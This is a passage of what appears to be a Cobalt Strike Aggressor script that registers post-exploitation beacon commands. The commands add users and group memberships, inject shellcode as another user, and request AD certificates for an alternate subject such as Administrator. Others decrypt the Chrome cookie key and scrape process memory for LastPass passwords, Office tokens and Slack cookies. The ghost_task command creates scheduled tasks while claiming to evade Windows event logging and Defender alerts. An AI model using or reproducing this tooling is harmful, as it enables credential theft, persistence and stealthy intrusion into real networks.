    if(size(@_) != 5)
    {
        berror($1, beacon_command_detail("addusertogroup"));
        berror($1, "Invalid number of parameters");
        return;
    }
    beacon_inline_execute($1, readbof_remote($1, "addusertogroup"), "go", bof_pack($1, "ZZZZ", $5, $4, $2, $3));
}

beacon_command_register(
    "addusertogroup",
    "Add the specified user to the specified group",
    "
Command: addusertogroup
Summary: Add the specified user to the group. Domain groups only!

Usage:   addusertogroup <USERNAME> <GROUPNAME> <SERVER> <DOMAIN>
         USERNAME   Required. The user name to activate/enable. 
         GROUPNAME  Required. The group to add the user to.
         SERVER     Required. The target computer to perform the addition on. use \"\" for the local machine
         DOMAIN     Required. The domain/computer for the account. You must give 
                    the domain name for the user if it is a domain account, or
                    use \"\" to target an account on the local machine.
                    
"
);

#adduser
alias adduser
{
    local('$bid $username $pass $server');

    if(size(@_) < 3 || size(@_) > 4)
    {
        berror($1, beacon_command_detail("adduser"));
        berror($1, "Invalid number of parameters");
        return;
    }
    else if(size(@_) == 3)
    {
        $bid = $1;
        $username = $2;
        $pass = $3;
        $server = "";
    }
    else if(size(@_) == 4)
    {
        $bid = $1;
        $username = $2;
        $pass = $3;
        $server = $4;
    }

    beacon_inline_execute($bid, readbof_remote($bid, "adduser"), "go", bof_pack($bid, "ZZZ", $username, $pass, $server));
}

beacon_command_register(
    "adduser",
    "Add a new user to a machine.",
    "
Command: adduser
Summary: Add a new user to a machine.

Usage:   adduser <USERNAME> <PASSWORD> <SERVER>
         USERNAME   Required. The name of the new user. 
         PASSWORD   Required. The password of the new user. 
         SERVER     Optional. If entered, the user will be created on that machine. If not, the
                    local machine will be used.
"
);

#enableuser <USERNAME> <DOMAIN>
alias unexpireuser
{
    if(size(@_) != 3)
    {
        berror($1, beacon_command_detail("unexpireuser"));
        berror($1, "Invalid number of parameters");
        return;
    }
    beacon_inline_execute($1, readbof_remote($1, "unexpireuser"), "go", bof_pack($1, "ZZ", $3, $2));
}

beacon_command_register(
    "unexpireuser",
    "Enables and unlocks the specified user account",
    "
Command: unexpireuser
Summary: Activates (and if necessary enables) the specified user account on the
         target computer. 
Usage:   unexpireuser <USERNAME> <DOMAIN>
         USERNAME  Required. The user name to activate/enable. 
         DOMAIN    Required. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account, or
                   use \"\" to target an account on the local machine.
"
);


#chromeKey
alias chromeKey{
    beacon_inline_execute($1, readbof_remote($1, "chromeKey"), "go", $null);
}

beacon_command_register(
    "chromeKey",
    "Decrypts the provided base64 encoded Chrome key",
    "
Command: chromeKey
Summary: This command decrypts the provided base64 encoded Chrome key for use 
         in decrypting cookies. If you get results, download the Cookies file 
         from either google or modern edge.  An example Filepath is:
  C:\\Users\\user\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies
         You can feed the key and cookie file into Chlonium to decrypt the 
         contents. Chlonium can be found here:
         https://github.com/rxwx/chlonium

Usage:   chromeKey
"  
);



sub bshspawnas {
    local('$bid $args $pass $username $domain $shellcode $shellcodelen $user $fp');

    $bid = $1;
    $domain = $2;
    $username = $3;
    $pass = $4;
    if(-exists $5)
    {
        $shellcodelen = lof($5);
        $fp = openf($5);
        $shellcode = readb($fp, $shellcodelen);
        closef($fp);
    }
    else
    {
        berror($bid, "Could not open file at path " . $5);
        return;
    }
    $user = binfo($bid, "user");
    if($user eq "SYSTEM *" || $user eq "SYSTEM")
    {
        berror($bid, "This function will not function properly as the system user");
        return;
    }
    $args = bof_pack($bid, "ZZZb", $domain, $username, $pass, $shellcode);
    beacon_inline_execute($bid, readbof_remote($bid, 'shspawnas'), "go", $args);

}

alias shspawnas {
    local('$shellcodepath $bid $username $pass $domain $ppid');
    if(size(@_) < 4)
    {
        berror($1, "Incorrect argument count");
        berror($1, beacon_command_detail('shspawnas'));
        return;
    }
    $bid = $1;
    $domain = $2;
    $username = $3;
    $pass = $4;
    if(size(@_) == 4)
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellcodepath = $1;
    }
    else
    {
        $shellcodepath = $5;
    }

    bshspawnas($bid, $domain, $username, $pass, $shellcodepath);
}


beacon_command_register(
    'shspawnas',
    'spawn / inject as specified user',
    "usage: shspawnas <domain> <username> <password> <opt: shellcodefile>
    If shellcode file is not provided a file browser will open so you can select it
    use \"\" for domain to log into the local machine
    Be aware the user you specify must be able to log into the machine interactivly and the login is recorded as such"
);

alias adcs_request {
	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine');

    if(size(@_) < 2)
    {
        berror($1, beacon_command_detail("adcs_request"));
		berror($1, "Need to provide the Certificate Authority at a minimum");
		return;
    }

	
	$adcs_request_ca = "";
	$adcs_request_template = "";
	$adcs_request_subject = "";
	$adcs_request_altname = "";
	$adcs_request_install = 0;
	$adcs_request_machine = 0;
	
    $adcs_request_ca = $2;
	$adcs_request_template = iff(-istrue $3, $3, "");
    $adcs_request_subject = iff(-istrue $4, $4, "");
    $adcs_request_altname = iff(-istrue $5, $5, "");
    $adcs_request_install = iff(-istrue $6, $6, 0);
    $adcs_request_machine = iff(-istrue $7, $7, 0);

	$args = bof_pack($1, "ZZZZss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine);
	beacon_inline_execute($1, readbof_remote($1, "adcs_request"), "go", $args);
}

beacon_command_register(
	"adcs_request",
	"Request an enrollment certificate",
	"
Command: adcs_request
Summary: This command connects a certificate authority and requests an enrollment 
         certificate of the specified type for the specified subject and alternative 
         name. It will also optionally install the certificate for the current context.
Usage:   adcs_request CA [opt:TEMPLATE] [opt:SUBJECT] [opt: ALTNAME] [opt: INSTALL] [opt:MACHINE]
         CA        Required. The certificate authority to use.
         TEMPLATE  Optional. The certificate type to request. Use \"\" for default of User/Machine
         SUBJECT   Optional. The subject's distinguished name. Use \"\" for default of current machine / user
         ALTNAME   Optional. The alternate subject's distinguished name. Use \"\" for default
         INSTALL   Optional. Install the certificate in current context? 0 = No, 1 = Yes. Default = 0
         MACHINE   Optional. Request a certificate for a machine instead of a user? 0 = No, 1 = Yes. Default = 0

         All arguments are positional. To a specify a non-default value for a optional you must specify a value for 
         All arguments prior to that given optional.

Examples:
basic:
    adcs_request cert.example.org\example-CERT-CA 

all options:
    adcs_request cert.example.org\example-CERT-CA vulnTemplate CN=Administrator,CN=Users,DC=example,DC=org CN=second_adm,CN=Users,DC=example,DC=org 0 0

use quotes for any arguments with spaces.
"
);

alias office_tokens 
{
	local('$pid $args');
	if(size(@_) != 2)
	{
		berror($1, "usage: office_tokens <pid>");
		return;
	}
	$pid = parseNumber($2, 10);
    berror($1, $pid);

	$args = bof_pack($1, "i", $pid);
	beacon_inline_execute($1, readbof_remote($1, "office_tokens"), "go", $args);
}

beacon_command_register(
	"office_tokens",
	"Searches memory for Office JWT Access Tokens",
	"Command: office_tokens

Usage: office_tokens <pid> "
);

alias lastpass
{
	local('$pid $args $value $i $buffer $arg_sz');
	$arg_sz = size(@_);
	if(size(@_) < 2)
	{
		berror($1, "usage: lastpass <pid1> <pid2> <pid3> .. <pidn>");
		return;
	}

    $buffer = allocate(0);

	for( $i = 1; $i < $arg_sz; $i++)
	{
        bwrite($buffer, "i", @_[$i]);
	}
    bwrite($buffer, "i", 0); # null terminator at the end
    closef($buffer);
    $value = readb($buffer, -1);

	$arg_sz = $arg_sz - 1;

	berror($1, $arg_sz);
	$args = bof_pack($1, "ib", $arg_sz, $value);
	beacon_inline_execute($1, readbof_remote($1, "lastpass"), "go", $args);
	berror($1, "FINISHED");
}

beacon_command_register(
	"lastpass",
	"Searches memory for LastPass passwords and hashes",
	"Command: lastpass 

Usage: lastpass <number of pids> <pid>,<pid>,<pid> ... "
);

alias suspend {
    local('$args');
    if(size(@_) < 2)
	{
		berror($1, beacon_command_detail("suspend"));
		return;
	}
    $args = bof_pack($1, "si", 1, $2);
    beacon_inline_execute($1, readbof_remote($1, "suspendresume"), "go", $args);
}

beacon_command_register(
    "suspend",
    "suspend a process by pid",
    "Command: suspend
    
Usage: suspend <pid>

attempts to suspend the process listed"
);

alias resume {
    local('$args');
    if(size(@_) < 2)
	{
		berror($1, beacon_command_detail("resume"));
		return;
	}
    $args = bof_pack($1, "si", 0, $2);
    beacon_inline_execute($1, readbof_remote($1, "suspendresume"), "go", $args);
}

beacon_command_register(
    "resume",
    "resume a process by pid",
    "Command: resume
    
Usage: resume <pid>

attempts to resume the process listed"
);

alias get_priv {
    local('$args');
    if(size(@_) < 2)
    {
        berror($1, beacon_command_detail("get_priv"));
        return;
    }
    $args = bof_pack($1, "z", $2);
    beacon_inline_execute($1, readbof_remote($1, "get_priv"), "go", $args);
}

beacon_command_register(
    "get_priv",
    "Activate a token privledge",
    "Command: get_priv

Usage: get_priv <Privledge Name>

Privledge names are listed here https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
They are the equivilent of what you see in whoami /all or our whoami bof from the SA repo
"
);

# ghost_task localhost add demo "cmd.exe" "/c notepad.exe" LAB\Administrator weekly 14:12 monday,thursday
# ghost_task localhost add "Microsoft\Office\Office Automatic Updates 2.0" "cmd.exe" "/c notepad.exe" LAB\employee001 daily 20:37
# ghost_task DC01.lab.corp add demo "cmd.exe" "/c notepad.exe" LAB\Administrator daily 15:19
# thx L.N.
alias ghost_task
{
    local('$arglen $hostname $operation $taskname $program $argument $username $scheduletype $time $day $args');
    $bid = $1;
    $arglen = size(@_);
    if ($arglen == 1) {
        berror($bid, "No computer name (e.g., localhost/remote server hostname) provided.\n");
        return;
    } else if ($arglen == 2) {
        berror($bid, "No reg task operation (e.g., add/delete) provided.\n");
        return;
    }
    $hostname = lc($2);
    $operation = lc($3);

    if($operation eq "add")
    {
       if ($arglen < 8) {
            berror($bid, beacon_command_detail("ghost_task"));
            return;
       }
       $taskname = lc($4);
       $program = lc($5);
       $argument = lc($6);
       $username = lc($7);
       $scheduletype = lc($8);
       if($scheduletype eq "weekly") {
            $time = lc($9);
            $day = lc($10);
            $args = bof_pack($bid, "izzzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time, $day);
       }
       else if ($scheduletype eq "second") {
            $time = lc($9);
            $args = bof_pack($bid, "izzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time);
       }
       else if ($scheduletype eq "daily") {
            $time = lc($9);
            $args = bof_pack($bid, "izzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time);
       }
       else if ($scheduletype eq "logon") {
            $args = bof_pack($bid, "izzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype);
       }
       else {
            berror($bid, "Unknown schedule type.\n");
            return;
       }
    }
    else if($operation eq "delete")
    {
        if ($arglen < 4) {
            berror($bid, beacon_command_detail("ghost_task"));
            return;
        }
        $taskname = lc($4);
        $args = bof_pack($bid, "izzz", $arglen, $hostname, $operation, $taskname);
    }
    else
    {
        berror($bid, beacon_command_detail("ghost_task"));
        return;
    }
    beacon_inline_execute($bid, readbof_remote($bid, "ghost_task"), "go", $args);
}

beacon_command_register(
    "ghost_task",
    "Create or modify a local or remote scheduled task, without triggering Windows events 4698 and 106.",
    "
Command: ghost_task
Summary: Create or modify a local or remote scheduled task, without triggering 
         Windows events 4698 and 106.         
Usage:   ghost_task <hostname/localhost> <operation> <taskname> <program> <argument> <username> <scheduletype> <time/second> <day>
         - hostname/localhost: Remote computer name or localhost.
         - operation: add/delete
           - add: Create or modify a scheduled task using only registry keys. Requires restarting the Schedule service to load the task definition.
           - delete: Delete a scheduled task. Requires restarting the Schedule service to offload the task.
         - taskname: Name of the scheduled task.
         - program: Program to be executed.
         - argument: Arguments for the program.
         - username: User account under which the scheduled task will run.
         - scheduletype: Supported triggers: second, daily, weekly, and logon.
         - time/second (applicable for 'second', 'daily', and 'weekly' triggers):
           - For 'second' trigger: Specify the frequency in seconds for task execution.
           - For 'daily' and 'weekly' triggers: Specify the exact time (e.g., 22:30) for task execution.
         - day (applicable for 'weekly' trigger): Days to execute the scheduled task (e.g., monday, thursday).
Note:    As of October 21, 2023, this tool has been tested on Windows 10, Windows Server 2016, 2019, and 2022
         As of October 21, 2023, no alert and no scheduled task creation event (ScheduledTaskCreated action type) will be generated in MDE (Microsoft Defender For Endpoint)
         To create a scheduled task using this tool, NT AUTHORITY/SYSTEM privileges are required
         After configuring the scheduled task, you'll need to either restart the system or await the next reboot for the task to be loaded into the Schedule service process and subsequently executed
"
);
alias slack_cookie 
{
	local('$pid $args');
	if(size(@_) != 2)
	{
		berror($1, "usage: slack_cookie <pid>");
		return;
	}
	$pid = parseNumber($2, 10);
    berror($1, $pid);

	$args = bof_pack($1, "i", $pid);
	beacon_inline_execute($1, readbof_remote($1, "slack_cookie"), "go", $args);
}

beacon_command_register(
	"slack_cookie",
	"Searches memory for Slack tokens",
	"Command: slack_cookie

Usage: slack_cookie <pid> "
);